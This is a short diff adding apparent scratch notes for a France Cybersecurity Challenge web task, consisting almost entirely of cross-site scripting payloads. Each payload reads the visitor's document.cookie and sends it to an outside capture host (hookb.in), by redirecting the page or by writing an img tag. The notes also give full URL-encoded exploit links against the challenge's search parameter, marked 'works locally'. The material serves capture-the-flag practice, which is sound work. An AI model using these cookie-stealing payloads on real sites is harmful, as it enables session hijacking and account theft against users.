@@ -1,0 +1,10 @@
+<script type="text/javascript">document.location="https://hookb.in/pzDneOmEZoSXNNqwalYG?cookie"+document.cookie;</script>
+
+http://challenges2.france-cybersecurity-challenge.fr:5001/index.php?search=%3Cscript+type%3D%22text%2Fjavascript%22%3Edocument.location%3D%22https%3A%2F%2Fhookb.in%2FpzDneOmEZoSXNNqwalYG%3Fcookie%22%2Bdocument.cookie%3Balert%281%29%3C%2Fscript%3E
+-> works locally
+
+<script type="text/javascript">document.write("<img src=\"https://hookb.in/pzDneOmEZoSXNNqwalYG?cookie"+document.cookie)</script>
+<script type="text/javascript">document.write('<img src="https://hookb.in/pzDneOmEZoSXNNqwalYG?cookie=' + document.cookie + '" />')</script>
+
+http://challenges2.france-cybersecurity-challenge.fr:5001/index.php?search=%3Cscript+type%3D%22text%2Fjavascript%22%3Edocument.write%28%27%3Cimg+src%3D%22https%3A%2F%2Fhookb.in%2FpzDneOmEZoSXNNqwalYG%3Fcookie%3D%27+%2B+document.cookie+%2B+%27%22+%2F%3E%27%29%3C%2Fscript%3E
+-> works locally
